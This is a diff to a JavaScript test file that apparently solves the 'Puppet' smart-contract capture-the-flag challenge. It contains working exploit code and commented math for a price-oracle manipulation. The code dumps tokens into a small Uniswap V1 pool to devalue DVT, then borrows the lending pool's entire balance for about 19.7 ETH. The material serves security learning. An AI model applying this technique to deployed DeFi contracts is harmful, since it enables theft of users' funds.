@@ -102,7 +102,97 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+      /**
+       * @dev
+       * Hack: the lending pool is using AMM spot prices as a price oracle (here from Uniswap), which can be easily exploited if we have enough funds to make a significant change in the ETH/token ratio of the AMM liquidity pool.
+       * Here, we have 1000DVT, while the Uniswap pool only has 10. By transfering our DVT to the pool, We can therefore make a drastic change in the pool ratio, resulting in a significant devaluation of the DVT relative to ETH.
+       * If the devaluation is large enough, we will be able to borrow 100,000DVT with the ETH funds we start with
+       * Method:
+       * 1- swap some of our DVT for ETH in the Uniswap pool => this will shift the spot price of the DVT/ETH pair
+       * The UniswapV1 swap price model is as follow:
+       * ETH_RECEIVED = 997 * DEPOSITED TOKEN * ETH_RESERVE / (TOKEN_RESERVE * 1000 + 997*DEPOSITED TOKEN)
+       * If we deposit 999DVT:
+       * ETH_RECEIVED = 997 * 999 * 10 / (10 * 1,000 + 997 * 999) ~= 9.9005 ETH
+       * 
+       * 2-After our swap, the DVT/ETH ratio in the pool is now:
+       * 1 DVT ~= ((10 - 9.9005)/1010) ~= 9.85e-5 ETH
+       * We call the price oracle from the lending pool to check what deposit is required to borrow all the DVT funds in the pool:
+       * DEPOSIT_REQUIRED ~= ((10 - 9.9005)/1010) * 100,000 * 2 ~= 19.7 ETH 
+       * We have enough ETH in our attacker funds to request the loan
+       * 
+       * 3- Borrow all the DVT tokens from the lending pool
+       */
+      await this.token
+        .connect(attacker)
+        .approve(
+          this.uniswapExchange.connect(attacker).address,
+          ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+      console.log('\u001b[1;32mBalance approved');
+
+      const logAttackerBalances = async (address, name) => {
+        const ethBal = await ethers.provider.getBalance(address);
+        const tokenBal = await this.token.balanceOf(address);
+
+        console.log(
+          `\u001b[1;33mETH Balance of ${name}:`,
+          ethers.utils.formatEther(ethBal)
+        );
+        console.log(
+          `\u001b[1;33mTKN Balance of ${name}:`,
+          ethers.utils.formatEther(tokenBal)
+        );
+        console.log('');
+      };
+
+      await logAttackerBalances(attacker.address, 'attacker');
+      await logAttackerBalances(this.uniswapExchange.address, 'uniswap');
+
+      const logTokenPriceonUniswap = async (amount) => {
+        const ethPayout = await this.uniswapExchange.getTokenToEthInputPrice(
+          amount,
+          {
+            gasLimit: 1e6,
+          }
+        );
+
+        console.log(
+          `\u001b[1;36mSwapping ${ethers.utils.formatEther(
+            amount
+          )} tokens will give ${ethers.utils.formatEther(ethPayout)} ETH`
+        );
+      };
+
+      await logTokenPriceonUniswap(ethers.utils.parseEther('999'));
+
+      console.log('\u001b[1;35mSwapping 999 tokens for ETH');
+
+      //Make sure to keep some tokens, otherwise you won't pass second success condition (token.balanceOf(attacker) needs to be strictly greater than POOL_INITIAL_TOKEN_BALANCE)
+      await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+        ethers.utils.parseEther('999'), // Exact amount of tokens to transfer
+        ethers.utils.parseEther('9'), // Min return of 9ETH
+        (await ethers.provider.getBlock('latest')).timestamp * 2 // deadline
+      );
+      await logAttackerBalances(attacker.address, 'attacker');
+      await logAttackerBalances(this.uniswapExchange.address, 'uniswap');
+
+      const deposit = await this.lendingPool.calculateDepositRequired(
+        POOL_INITIAL_TOKEN_BALANCE
+      );
+      console.log(
+        '\u001b[1;36mDeposit required to take all the tokens from the pool:',
+        ethers.utils.formatEther(deposit)
+      );
+      console.log(`\u001b[1;35mStarting the final attack: borrowing all the pool's DVT tokens `);
+      await this.lendingPool
+        .connect(attacker)
+        .borrow(POOL_INITIAL_TOKEN_BALANCE, {
+          value: deposit,
+        });
+
+      await logAttackerBalances(attacker.address, 'attacker');
+      await logAttackerBalances(this.lendingPool.address, 'lending pool');
+      /** CODE YOUR EXPLOIT HERE */
     });
 
     after(async function () {
